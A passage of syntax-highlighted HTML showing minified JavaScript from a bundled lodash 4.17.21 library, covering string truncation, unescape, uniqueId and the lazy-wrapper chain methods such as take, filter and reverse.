&#123;</span><br><span class="line">                                        <span class="keyword">var</span> a = <span class="title class_">We</span>(t);</span><br><span class="line">                                        o = a.<span class="property">length</span></span><br><span class="line">                                    &#125;</span><br><span class="line">                                    <span class="keyword">if</span> (n &gt;= o)</span><br><span class="line">                                        <span class="keyword">return</span> t;</span><br><span class="line">                                    <span class="keyword">var</span> c = n - <span class="title class_">Ye</span>(r);</span><br><span class="line">                                    <span class="keyword">if</span> (c &lt; <span class="number">1</span>)</span><br><span class="line">                                        <span class="keyword">return</span> r;</span><br><span class="line">                                    <span class="keyword">var</span> s = a ? <span class="title function_">li</span>(a, <span class="number">0</span>, c).<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>) : t.<span class="title function_">slice</span>(<span class="number">0</span>, c);</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="keyword">void</span> <span class="number">0</span> === i)</span><br><span class="line">                                        <span class="keyword">return</span> s + r;</span><br><span class="line">                                    <span class="keyword">if</span> (a &amp;&amp; (c += s.<span class="property">length</span> - c),</span><br><span class="line">                                        <span class="title class_">Ga</span>(i)) &#123;</span><br><span class="line">                                        <span class="keyword">if</span> (t.<span class="title function_">slice</span>(c).<span class="title function_">search</span>(i)) &#123;</span><br><span class="line">                                            <span class="keyword">var</span> u, l = s;</span><br><span class="line">                                            <span class="keyword">for</span> (i.<span class="property">global</span> || (i = <span class="title function_">vt</span>(i.<span class="property">source</span>, <span class="title function_">sc</span>(rt.<span class="title function_">exec</span>(i)) + <span class="string">&quot;g&quot;</span>)),</span><br><span class="line">                                                     i.<span class="property">lastIndex</span> = <span class="number">0</span>; u = i.<span class="title function_">exec</span>(l);)</span><br><span class="line">                                                 <span class="keyword">var</span> h = u.<span class="property">index</span>;</span><br><span class="line">                                            s = s.<span class="title function_">slice</span>(<span class="number">0</span>, <span class="keyword">void</span> <span class="number">0</span> === h ? c : h)</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (t.<span class="title function_">indexOf</span>(<span class="title class_">Jr</span>(i), c) != c) &#123;</span><br><span class="line">                                        <span class="keyword">var</span> f = s.<span class="title function_">lastIndexOf</span>(i);</span><br><span class="line">                                        f &gt; -<span class="number">1</span> &amp;&amp; (s = s.<span class="title function_">slice</span>(<span class="number">0</span>, f))</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    <span class="keyword">return</span> s + r</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">unescape</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> (t = <span class="title function_">sc</span>(t)) &amp;&amp; D.<span class="title function_">test</span>(t) ? t.<span class="title function_">replace</span>(j, <span class="title class_">Ge</span>) : t</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">uniqueId</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> e = ++<span class="title class_">Mt</span>;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title function_">sc</span>(t) + e</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">upperCase</span> = <span class="title class_">Nc</span>,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">upperFirst</span> = <span class="title class_">Rc</span>,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">each</span> = sa,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">eachRight</span> = ua,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">first</span> = jo,</span><br><span class="line">                                <span class="title class_">Qc</span>(<span class="title class_">An</span>, (hs = &#123;&#125;,</span><br><span class="line">                                    <span class="title function_">ur</span>(<span class="title class_">An</span>, (<span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                            zt.<span class="title function_">call</span>(<span class="title class_">An</span>.<span class="property"><span class="keyword">prototype</span></span>, e) || (hs[e] = t)</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    )),</span><br><span class="line">                                    hs), &#123;</span><br><span class="line">                                    <span class="attr">chain</span>: !<span class="number">1</span></span><br><span class="line">                                &#125;),</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">VERSION</span> = <span class="string">&quot;4.17.21&quot;</span>,</span><br><span class="line">                                <span class="title function_">ce</span>([<span class="string">&quot;bind&quot;</span>, <span class="string">&quot;bindKey&quot;</span>, <span class="string">&quot;curry&quot;</span>, <span class="string">&quot;curryRight&quot;</span>, <span class="string">&quot;partial&quot;</span>, <span class="string">&quot;partialRight&quot;</span>], (<span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                        <span class="title class_">An</span>[t].<span class="property">placeholder</span> = <span class="title class_">An</span></span><br><span class="line">                                    &#125;</span><br><span class="line">                                )),</span><br><span class="line">                                <span class="title function_">ce</span>([<span class="string">&quot;drop&quot;</span>, <span class="string">&quot;take&quot;</span>], (<span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                        <span class="title class_">Ln</span>.<span class="property"><span class="keyword">prototype</span></span>[t] = <span class="keyword">function</span> (<span class="params">n</span>) &#123;</span><br><span class="line">                                            n = <span class="keyword">void</span> <span class="number">0</span> === n ? <span class="number">1</span> : <span class="title function_">cn</span>(<span class="title function_">ic</span>(n), <span class="number">0</span>);</span><br><span class="line">                                            <span class="keyword">var</span> r = <span class="variable language_">this</span>.<span class="property">__filtered__</span> &amp;&amp; !e ? <span class="keyword">new</span> <span class="title class_">Ln</span>(<span class="variable language_">this</span>) : <span class="variable language_">this</span>.<span class="title function_">clone</span>();</span><br><span class="line">                                            <span class="keyword">return</span> r.<span class="property">__filtered__</span> ? r.<span class="property">__takeCount__</span> = <span class="title function_">sn</span>(n, r.<span class="property">__takeCount__</span>) : r.<span class="property">__views__</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">                                                <span class="attr">size</span>: <span class="title function_">sn</span>(n, <span class="number">4294967295</span>),</span><br><span class="line">                                                <span class="attr">type</span>: t + (r.<span class="property">__dir__</span> &lt; <span class="number">0</span> ? <span class="string">&quot;Right&quot;</span> : <span class="string">&quot;&quot;</span>)</span><br><span class="line">                                            &#125;),</span><br><span class="line">                                                r</span><br><span class="line">                                        &#125;</span><br><span class="line">                                            ,</span><br><span class="line">                                            <span class="title class_">Ln</span>.<span class="property"><span class="keyword">prototype</span></span>[t + <span class="string">&quot;Right&quot;</span>] = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">                                                <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">reverse</span>()[t](e).<span class="title function_">reverse</span>()</span><br><span class="line">                                            &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                )),</span><br><span class="line">                                <span class="title function_">ce</span>([<span class="string">&quot;filter&quot;</span>, <span class="string">&quot;map&quot;</span>, <span class="string">&quot;takeWhile&quot;</span>], (<span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                        <span class="keyword">var</span> n = e + <span class="number">1</span></span><br><span class="line">                                            , r = <span class="number">1</span> == n || <span class="number">3</span> == n;</span><br><span class="line">                                        <span class="title class_">Ln</span>.<span class="property"><span class="keyword">prototype</span></span>[t] = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                            <span class="keyword">var</span> e = <span class="variable language_">this</span>.<span class="title function_">clone</span>();</span><br><span class="line">                                            <span class="keyword">return</span> e.<span class="property">__iteratees__</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">                                                <span class="attr">iteratee</span>: <span class="title class_">Qi</span>(t, <span class="number">3</span>),</span><br><span class="line">                                                <span class="attr">type</span>: n</span><br><span class="line">                                            &#125;),</span><br><span class="line">                                                e.<span class="property">__filtered__</span> = e.<span class="property">__filtered__</span> || r,</span><br><span class="line">                                                e</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                )),</span><br><span class="line">                                <span class="title function_">ce</span>([<span class="string">&quot;head&quot;</span>, <span class="string">&quot;last&quot;</span>], (<span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                        <span class="keyword">var</span> n = <span class="string">&quot;take&quot;</span> + (e ? <span class="string">&quot;Right&quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">                                        <span class="title class_">Ln</span>.<span class="property"><span class="keyword">prototype</span></span>[t] = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                                            <span class="keyword">return</span> <span class="variable language_">this</span>[n](<span class="number">1</span>).<span class="title function_">value</span>()[<span class="number">0</span>]</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                )),</span><br><span class="line">                                <span class="title function_">ce</span>([<span class="string">&quot;initial&quot;</span>, <span class="string">&quot;tail&quot;</span>], (<span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                        <span class="keyword">var</span> n = <span class="string">&quot;drop&quot;</span> + (e ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;Right&quot;</span>);</span><br><span class="line">                                        <span class="title class_">Ln</span>.<span class="property"><span class="keyword">prototype</span></span>[t] = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                                            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">__filtered__</span> ? <span class="keyword">new</span> <span class="title class_">Ln</span>(<span class="variable language_">this</span>) : <span class="variable language_">this</span>[n](<span class="number">1</span>)</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                )),</span><br><span class="line">                                <span class="title class_">Ln</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">compact</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">filter</span>(<span class="title class_">Wc</span>)</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">Ln</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">find</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">filter</span>(t).<span class="title function_">head</span>()</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">Ln</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">findLast</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">reverse</span>().<span class="title function_">find</span>(t)</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">Ln</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">invokeMap</span> = <span class="title class_">Nr</span>((<span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                        <span class="keyword">return</span> <span class="string">&quot;function&quot;</span> == <span class="keyword">typeof</span> t ? <span class="keyword">new</span> <span class="title class_">Ln</span>(<span class="variable language_">this</span>) : <span class="variable language_">this</span>.<span class="title function_">map</span>((<span class="keyword">function</span> (<span class="params">n</span>) &#123;</span><br><span class="line">                                                <span class="keyword">return</span> <span class="title function_">br</span>(n, t, e)</span><br><span class="line">                                            &#125;</span><br><span class="line">                                        ))</span><br><span class="line">                                    &#125;</span><br><span class="line">                                )),</span><br><span class="line">                                <span class="title class_">Ln</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">reject</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">filter</span>(<span class="title class_">Sa</span>(<span class="title class_">Qi</span>(t)))</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">Ln</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">slice</span> = <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                    t = <span class="title function_">ic</span>(t);</span><br><span class="line">                                    <span class="keyword">var</span> n = <span class="variable language_">this</span>;</span><br><span class="line">                                    <span class="keyword">return</span> n.<span class="property">__filtered__</span> &amp;&amp; (t &gt; <span class="number">0</span> || e &lt; <span class="number">0</span>) ? <span class="keyword">new</span> <span class="title class_">Ln</span>(n) : (t &lt; <span class="number">0</span> ? n = n.<span class="title function_">takeRight</span>(-t) : t &amp;&amp; (n = n.<span class="title function_">drop</span>(t)),</span><br><span class="line">                                    <span class="keyword">void</span> <span class="number">0</span> !== e &amp;&amp; (n = (e = <span class="title function_">ic</span>(e)) &lt; <span class="number">0</span> ? n.<span class="title function_">dropRight</span>(-e) : n.<span class="title function_">take</span>(e - t)),</span><br><span class="line">                                        n)</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">Ln</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">takeRightWhile</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">reverse</span>().<span class="title function_">takeWhile</span>(t).<span class="title function_">reverse</span>()</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">Ln</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toArray</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">take</span>(<span class="number">4294967295</span>)</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title function_">ur</span>(<span class="title class_">Ln</span>.<span class="property"><span class="keyword">prototype</span></span>, (<span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                        <span class="keyword">var</span> n = <span class="regexp">/^(?:filter|find|map|reject)|While$/</span>.<span class="title function_">test</span>(e)</span><br><span class="line">                                            , r = <span class="regexp">/^(?:head|last)$/</span>.<span class="title function_">test</span>(e)</span><br><span class="line">                                            , i = <span class="title class_">An</span>[r ? <span class="string">&quot;take&quot;</span> + (<span class="string">&quot;last&quot;</span> == e ? <span class="string">&quot;Right&quot;</span> : <span class="string">&quot;&quot;</span>) : e]</span><br><span class="line">                                            , o = r || <span class="regexp">/^find/</span>.<span class="title function_">test</span>(e);</span><br><span class="line">                                        i &amp;&amp; (<span class="title class_">An</span>.<span class="property"><span class="keyword">prototype</span></span>[e] = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                                                <span class="keyword">var</span> e = <span class="variable language_">this</span>.<span class="property">__wrapped__</span></span><br><span class="line">                                                    , a = r ? [<span class="number">1</span>] : <span class="variable language_">arguments</span></span><br><span class="line">                                                    , c = e <span class="keyword">instanceof</span> <span class="title class_">Ln</span></span><br><span class="line">                                                    , s = a[<span class="number">0</span>]</span><br><span class="line">                                                    , u = c || <span class="title class_">Va</span>(e)</span><br><span class="line">                                                    , l = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                                    <span class="keyword">var</span> e = i.<span class="title function_">apply</span>(<span class="title class_">An</span>, <span class="title function_">pe</span>([t], a));</span><br><span class="line">                                                    <span class="keyword">return</span> r &amp;&amp; h ? e[<span class="number">0</span>] : e</span><br><span class="line">                                                &#125;;</span><br><span class="line">                                                u &amp;&amp; n &amp;&amp; <span class="string">&quot;function&quot;</span> == <span class="keyword">typeof</span> s &amp;&amp; <span class="number">1</span> != s.<span class="property">length</span> &amp;&amp; (c = u = !<span class="number">1</span>);</span><br><span class="line">                                                <span class="keyword">var</span> h = <span class="variable language_">this</span>.<span class="property">__chain__</span></span><br><span class="line">                                                    , f = !!<span class="variable language_">this</span>.<span class="property">__actions__</span>.<span class="property">length</span></span><br><span class="line">                                                    , d = o &amp;&amp; !h</span><br><span class="line">                                                    , p = c &amp;&amp; !f;</span><br><span class="line">                                                <span class="keyword">if</span> (!o &amp;&amp; u) &#123;</span><br><span class="line">                                                    e = p ? e : <span class="keyword">new</span> <span class="title class_">Ln</span>(<span class="variable language_">this</span>);</span><br><span class="line">                                                    <span class="keyword">var</span> v = t.<span class="title function_">apply</span>(e, a);</span><br><span class="line">                                                    <span class="keyword">return</span> v.<span class="property">__actions__</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">                                                        <span class="attr">func</span>: ra,</span><br><span class="line">                                                        <span class="attr">args</span>: [l],</span><br><span class="line">                                                        <span class="attr">thisArg</span>: <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">                                                    &#125;),</span><br><span class="line">                                                        <span class="keyword">new</span> <span class="title function_">kn</span>(v, h)</span><br><span class="line">                                                &#125;</span><br><span class="line">                                                <span class="keyword">return</span> d &amp;&amp; p ? t.<span class="title function_">apply</span>(<span class="variable language_">this</span>, a) : (v = <span class="variable language_">this</span>.<span class="title function_">thru</span>(l),</span><br><span class="line">                                                    d ? r ? v.<span class="title function_">value</span>()[<span class="number">0</span>] : v.<span class="title function_">value</span>() : v)</span><br><span class="line">                                            &#125;</span><br><span class="line">                                        )</span><br><span class="line">                                    &#125;</span><br><span class="line">                                )),</span><br><span class="line">                                <span class="title function_">ce</span>([<span class="string">&quot;pop&quot;</span>, <span class="string">&quot;push&quot;</span>, <span class="string">&quot;shift&quot;</span>, <span class="string">&quot;sort&quot;</span>, <span class="string">&quot;splice&quot;</span>, <span class="string">&quot;unshift&quot;</span>], (<span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                        <span class="keyword">var</span> e = yt[t]</span><br><span class="line">                                            , n = <span class="regexp">/^(?:push|sort|unshift)$/</span>.<span class="title function_">test</span>(t) ? <span class="string">&quot;tap&quot;</span> : <span class="string">&quot;thru&quot;</span></span><br><span class="line">                                            , r = <span class="regexp">/^(?:pop|shift)$/</span>.<span class="title function_">test</span>(t);</span><br><span class="line">                                        <span class="title class_">An</span>.<span class="property"><span class="keyword">prototype</span></span>[t] = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                                            <span class="keyword">var</span> t = <span class="variable language_">arguments</span>;</span><br><span class="line">                                            <span class="keyword">if</span> (r &amp;&amp; !<span class="variable language_">this</span>.<span class="property">__chain__</span>) &#123;</span><br><span class="line">                                                <span class="keyword">var</span> i = <span class="variable language_">this</span>.<span class="title function_">value</span>();</span><br><span class="line">                                                <span class="keyword">return</span> e.<span class="title function_">apply</span>(<span class="title class_">Va</span>(i) ? i : [], t)</span><br><span class="line">                                            &#125;</span><br><span class="line">                                            <span class="keyword">return</span> <span class="variable language_">this</span>[n]((<span class="keyword">function</span> (<span class="params">n</span>) &#123;</span><br><span class="line">                                                    <span class="keyword">return</span> e.<span class="title function_">apply</span>(<span class="title class_">Va</span>(n) ? n : [], t)</span><br><span class="line">                                                &#125;</span><br><span class="line">                                            ))</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                )),</span><br><span class="line">                                <span class="title function_">ur</span>(<span class="title class_">Ln</span>.<span class="property"><span class="keyword">prototype</span></span>, (<span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                        <span class="keyword">var</span> n = <span class="title class_">An</span>[e];</span><br><span class="line">                                        <span class="keyword">if</span> (n) &#123;</span><br><span class="line">                                            <span class="keyword">var</span> r = n.<span class="property">name</span> + <span class="string">&quot;&quot;</span>;</span><br><span class="line">                                            zt.<span class="title function_">call</span>(wn, r) || (wn[r] = []),</span><br><span class="line">                                                wn[r].<span class="title function_">push</span>(&#123;</span><br><span class="line">                                                    <span class="attr">name</span>: e,</span><br><span class="line">                                                    <span class="attr">func</span>: n</span><br><span class="line">                                                &#125;)</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                )),</span><br><span class="line">                                wn[<span class="title class_">Ai</span>(<span class="keyword">void</span> <span class="number">0</span>, <span class="number">2</span>).<span class="property">name</span>] = [&#123;</span><br><span class="line">                                    <span class="attr">name</span>: <span class="string">&quot;wrapper&quot;</span>,</span><br><span class="line">                                    <span class="attr">func</span>: <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">                                &#125;],</span><br><span class="line">                                <span class="title class_">Ln</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">clone</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> t = <span class="keyword">new</span> <span class="title class_">Ln</span>(<span class="variable language_">this</span>.<span class="property">__wrapped__</span>);</span><br><span class="line">                                    <span class="keyword">return</span> t.<span class="property">__actions__</span> = <span class="title function_">yi</span>(<span class="variable language_">this</span>.<span class="property">__actions__</span>),</span><br><span class="line">                                        t.<span class="property">__dir__</span> = <span class="variable language_">this</span>.<span class="property">__dir__</span>,</span><br><span class="line">                                        t.<span class="property">__filtered__</span> = <span class="variable language_">this</span>.<span class="property">__filtered__</span>,</span><br><span class="line">                                        t.<span class="property">__iteratees__</span> = <span class="title function_">yi</span>(<span class="variable language_">this</span>.<span class="property">__iteratees__</span>),</span><br><span class="line">                                        t.<span class="property">__takeCount__</span> = <span class="variable language_">this</span>.<span class="property">__takeCount__</span>,</span><br><span class="line">                                        t.<span class="property">__views__</span> = <span class="title function_">yi</span>(<span class="variable language_">this</span>.<span class="property">__views__</span>),</span><br><span class="line">                                        t</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">Ln</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">reverse</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">__filtered__</span>) &#123;</span><br><span class="line">                                        <span class="keyword">var</span> t = <span class="keyword">new</span> <span class="title class_">Ln</span>(<span class="variable language_">this</span>);</span><br><span class="line">                                        t.<span class="property">__dir__</span> = -<span class="number">1</span>,</span><br><span class="line">                                            t.<span class="property">__filtered__</span> = !<span class="number">0</span></span><br><span class="line">                                    &#125; <span class="keyword">else</span></span><br><span class="line">                                        (t = <span class="variable language_">this</span>.<span class="title function_">clone</span>()).<span class="property">__dir__</span> *= -<span class="number">1</span>;</span><br><span class="line">                                    <span class="keyword">return</span> t</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">Ln</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">value</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> t = <span class="variable language_">this</span>.<span class="property">__wrapped__</span>.<span class="title function_">value</span>()</span><br><span class="line">                                        , e = <span class="variable language_">this</span>.<span class="property">__dir__</span></span><br><span class="line">                                        , n = <span class="title class_">Va</span>(t)</span><br><span class="line">                                        , r = e &lt; <span class="number">0</span></span><br><span class="line">                                        , i = n ? t.<span class="property">length</span> : <span class="number">0</span></span><br><span class="line">                                        , o = <span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                        <span class="keyword">var</span> r = -<span class="number">1</span></span><br><span class="line">                                            , i = n.<span class="property">length</span>;</span><br><span class="line">                                        <span class="keyword">for</span> (; ++r &lt; i;) &#123;</span><br><span class="line">                                            <span class="keyword">var</span> o = n[r]</span><br><span class="line">                                                , a = o.<span class="property">size</span>;</span><br><span class="line">                                            <span class="keyword">switch</span> (o.<span class="property">type</span>) &#123;</span><br><span class="line">                                                <span class="keyword">case</span> <span class="string">&quot;drop&quot;</span>:</span><br><span class="line">                                                    t += a;</span><br><span class="line">                                                    <span class="keyword">break</span>;</span><br><span class="line">                                                <span class="keyword">case</span> <span class="string">&quot;dropRight&quot;</span>:</span><br><span class="line">                                                    e -= a;</span><br><span class="line">                                                    <span class="keyword">break</span>;</span><br><span class="line">                                                <span class="keyword">case</span> <span class="string">&quot;take&quot;</span>:</span><br><span class="line">                                                    e = <span class="title function_">sn</span>(e, t + a);</span><br><span class="line">                                                    <span class="keyword">break</span>;</span><br><span class="line">                                                <span class="keyword">case</span> <span class="string">&quot;takeRight&quot;</span>:</span><br><span class="line">                                                    t = <span class="title function_">cn</span>(t, e - a)</span><br><span class="line">                                            &#125;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                        <span class="keyword">return</span> &#123;</span><br><span class="line">                                            <span class="attr">start</span>: t,</span><br><span class="line">                                            <span class="attr">end</span>: e</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;(<span class="number">0</span>, i, <span class="variable language_">this</span>.<span class="property">__views__</span>)</span><br><span class="line">                                        , a = o.<span class="property">start</span></span><br><span class="line">                                        , c = o.<span class="property">end</span></span><br><span class="line">                                        , s = c - a</span><br><span class="line">                                        , u = r ? c : a - <span class="number">1</span></span><br><span class="line">                                        , l = <span class="variable language_">this</span>.<span class="property">__iteratees__</span></span><br><span class="line">                                        , h = l.<span class="property">length</span></span><br><span class="line">                                        , f = <span class="number">0</span></span><br><span class="line">                                        , d = <span class="title function_">sn</span>(s, <span class="variable language_">this</span>.<span class="property">__takeCount__</span>);</span><br><span class="line">                                    <span class="keyword">if</span> (!n || !r &amp;&amp; i == s &amp;&amp; d == s)</span><br><span class="line">                                        <span class="keyword">return</span> <span class="title function_">ri</span>(t, <span class="variable language_">this</span>.<span class="property">__actions__</span>);</span><br><span class="line">                                    <span class="keyword">var</span> p = [];</span><br><span class="line">                                    <span class="attr">t</span>: <span class="keyword">for</span> (; s-- &amp;&amp; f &lt; d;) &#123;</span><br><span class="line">                                        <span class="keyword">for</span> (<span class="keyword">var</span> v = -<span class="number">1</span>, m = t[u += e]; ++v &lt; h;) &#123;</span><br><span class="line">                                            <span class="keyword">var</span> g = l[v]</span><br><span class="line">                                                , y = g.<span class="property">iteratee</span></span><br><span class="line">                                                , b = g.<span class="property">type</span></span><br><span class="line">                                                , w = <span class="title function_">y</span>(m);</span><br><span class="line">                                            <span class="keyword">if</span> (<span class="number">2</span> == b)</span><br><span class="line">                                                m = w;</span><br><span class="line">                                            <span class="keyword">else</span> <span class="keyword">if</span> (!w) &#123;</span><br><span class="line">                                                <span class="keyword">if</span> (<span class="number">1</span> == b)</span><br><span class="line">                                                    <span class="keyword">continue</span> t;</span><br><span class="line">                                                <span class="keyword">break</span> t</span><br><span class="line">                                            &#125;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                        p[f++] = m</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    <span class="keyword">return</span> p</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">at</span> = ia,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">chain</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title function_">na</span>(<span class="variable language_">this</span>)</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">commit</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title function_">kn</span>(<span class="variable language_">this</span>.<span class="title function_">value</span>(), <span class="variable language_">this</span>.<span class="property">__chain__</span>)</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">next</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                                    <span class="keyword">void</span> <span class="number">0</span> === <span class="variable language_">this</span>.<span class="property">__values__</span> &amp;&amp; (<span class="variable language_">this</span>.<span class="property">__values__</span> = <span class="title function_">nc</span>(<span class="variable language_">this</span>.<span class="title function_">value</span>()));</span><br><span class="line">                                    <span class="keyword">var</span> t = <span class="variable language_">this</span>.<span class="property">__index__</span> &gt;= <span class="variable language_">this</span>.<span class="property">__values__</span>.<span class="property">length</span>;</span><br><span class="line">                                    <span class="keyword">return</span> &#123;</span><br><span class="line">                                        <span class="attr">done</span>: t,</span><br><span class="line">                                        <span class="attr">value</span>: t ? <span class="keyword">void</span> <span class="number">0</span> : <span class="variable language_">this</span>.<span class="property">__values__</span>[<span class="variable language_">this</span>.<span class="property">__index__</span>++]</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">plant</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">for</span> (<span class="keyword">var</span> e, n = <span class="variable language_">this</span>; n <span class="keyword">instanceof</span> <span class="title class_">En</span>;) &#123;</span><br><span class="line">                                        <span class="keyword">var</span> r = <span class="title class_">Ao</span>(n);</span><br><span class="line">                                        r.<span class="property">__index__</span> = <span class="number">0</span>,</span><br><span class="line">                                            r.<span class="property">__values__</span> = <span class="keyword">void</span> <span class="number">0</span>,</span><br><span class="line">                                            e ? i.<span class="property">__wrapped__</span> = r : e = r;</span><br><span class="line">                                        <span class="keyword">var</span> i = r;</span><br><span class="line">                                        n = n.<span class="property">__wrapped__</span></span><br><span class="line">                                    &#125;</span><br><span class="line">                                    <span class="keyword">return</span> i.<span class="property">__wrapped__</span> = t,</span><br><span class="line">                                        e</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                            